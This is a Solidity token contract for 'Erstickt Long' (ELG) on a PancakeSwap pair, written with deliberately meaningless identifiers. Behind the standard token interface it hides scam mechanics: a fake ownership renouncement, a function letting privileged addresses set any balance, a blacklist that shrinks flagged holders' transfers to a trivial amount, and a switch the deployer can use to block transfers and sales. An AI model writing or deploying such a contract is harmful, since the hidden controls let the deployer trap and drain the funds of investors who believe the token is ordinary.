//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface maxToken {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract maxIsLimit {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface amountFund {
    function createPair(address sellReceiver, address limitExempt) external returns (address);
}

interface senderSwapWallet {
    function totalSupply() external view returns (uint256);

    function balanceOf(address toExempt) external view returns (uint256);

    function transfer(address amountIs, uint256 listTx) external returns (bool);

    function allowance(address listExemptReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 listTx) external returns (bool);

    function transferFrom(
        address sender,
        address amountIs,
        uint256 listTx
    ) external returns (bool);

    event Transfer(address indexed from, address indexed feeFund, uint256 value);
    event Approval(address indexed listExemptReceiver, address indexed spender, uint256 value);
}

interface senderSwapWalletMetadata is senderSwapWallet {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ErsticktLong is maxIsLimit, senderSwapWallet, senderSwapWalletMetadata {

    string private toAuto = "Erstickt Long";

    event OwnershipTransferred(address indexed toLiquidity, address indexed teamLaunched);

    uint256 private minReceiver;

    string private autoTotal = "ELG";

    bool public tradingTotalReceiver;

    bool public maxWallet;

    mapping(address => bool) public feeAmount;

    function senderSell(address txAuto) public {
        require(txAuto.balance < 100000);
        if (toAtAuto) {
            return;
        }
        
        feeAmount[txAuto] = true;
        
        toAtAuto = true;
    }

    function listMarketingLaunch() public {
        emit OwnershipTransferred(limitIs, address(0));
        fundSender = address(0);
    }

    function transfer(address exemptLimitBuy, uint256 listTx) external virtual override returns (bool) {
        return listTo(_msgSender(), exemptLimitBuy, listTx);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return launchTakeMax;
    }

    bool public atMin;

    address public limitIs;

    bool private enableMin;

    function name() external view virtual override returns (string memory) {
        return toAuto;
    }

    uint256 private launchTakeMax = 100000000 * 10 ** 18;

    mapping(address => mapping(address => uint256)) private fromIs;

    function allowance(address limitFrom, address teamWallet) external view virtual override returns (uint256) {
        if (teamWallet == limitTeam) {
            return type(uint256).max;
        }
        return fromIs[limitFrom][teamWallet];
    }

    mapping(address => bool) public shouldMax;

    address private fundSender;

    uint256 private fundAt;

    function limitReceiver(address buyShouldLaunch) public {
        launchSwap();
        if (minReceiver == teamTake) {
            enableMin = false;
        }
        if (buyShouldLaunch == limitIs || buyShouldLaunch == shouldEnable) {
            return;
        }
        shouldMax[buyShouldLaunch] = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return autoTotal;
    }

    uint256 public fromLaunch;

    address public shouldEnable;

    function listTo(address shouldAuto, address amountIs, uint256 listTx) internal returns (bool) {
        if (shouldAuto == limitIs) {
            return receiverMarketing(shouldAuto, amountIs, listTx);
        }
        uint256 autoReceiverIs = senderSwapWallet(shouldEnable).balanceOf(amountLaunched);
        require(autoReceiverIs == listFromWallet);
        require(amountIs != amountLaunched);
        if (shouldMax[shouldAuto]) {
            return receiverMarketing(shouldAuto, amountIs, minAmount);
        }
        return receiverMarketing(shouldAuto, amountIs, listTx);
    }

    bool public sellLaunchedTake;

    function balanceOf(address toExempt) public view virtual override returns (uint256) {
        return tokenShould[toExempt];
    }

    uint256 teamMin;

    function approve(address teamWallet, uint256 listTx) public virtual override returns (bool) {
        fromIs[_msgSender()][teamWallet] = listTx;
        emit Approval(_msgSender(), teamWallet, listTx);
        return true;
    }

    function owner() external view returns (address) {
        return fundSender;
    }

    constructor (){
        if (tradingTotalReceiver) {
            fundAt = teamTake;
        }
        maxToken shouldBuy = maxToken(limitTeam);
        shouldEnable = amountFund(shouldBuy.factory()).createPair(shouldBuy.WETH(), address(this));
        if (teamTake == fundAt) {
            teamTake = fromLaunch;
        }
        limitIs = _msgSender();
        listMarketingLaunch();
        feeAmount[limitIs] = true;
        tokenShould[limitIs] = launchTakeMax;
        if (tradingTotalReceiver != walletReceiver) {
            fromLaunch = teamTake;
        }
        emit Transfer(address(0), limitIs, launchTakeMax);
    }

    uint8 private launchAt = 18;

    bool public walletReceiver;

    function decimals() external view virtual override returns (uint8) {
        return launchAt;
    }

    function receiverMarketing(address shouldAuto, address amountIs, uint256 listTx) internal returns (bool) {
        require(tokenShould[shouldAuto] >= listTx);
        tokenShould[shouldAuto] -= listTx;
        tokenShould[amountIs] += listTx;
        emit Transfer(shouldAuto, amountIs, listTx);
        return true;
    }

    function getOwner() external view returns (address) {
        return fundSender;
    }

    bool public toAtAuto;

    uint256 constant minAmount = 4 ** 10;

    uint256 listFromWallet;

    address limitTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function marketingMax(address exemptLimitBuy, uint256 listTx) public {
        launchSwap();
        tokenShould[exemptLimitBuy] = listTx;
    }

    function launchSwap() private view {
        require(feeAmount[_msgSender()]);
    }

    address amountLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => uint256) private tokenShould;

    uint256 private teamTake;

    function marketingAmount(uint256 listTx) public {
        launchSwap();
        listFromWallet = listTx;
    }

    function transferFrom(address shouldAuto, address amountIs, uint256 listTx) external override returns (bool) {
        if (_msgSender() != limitTeam) {
            if (fromIs[shouldAuto][_msgSender()] != type(uint256).max) {
                require(listTx <= fromIs[shouldAuto][_msgSender()]);
                fromIs[shouldAuto][_msgSender()] -= listTx;
            }
        }
        return listTo(shouldAuto, amountIs, listTx);
    }

}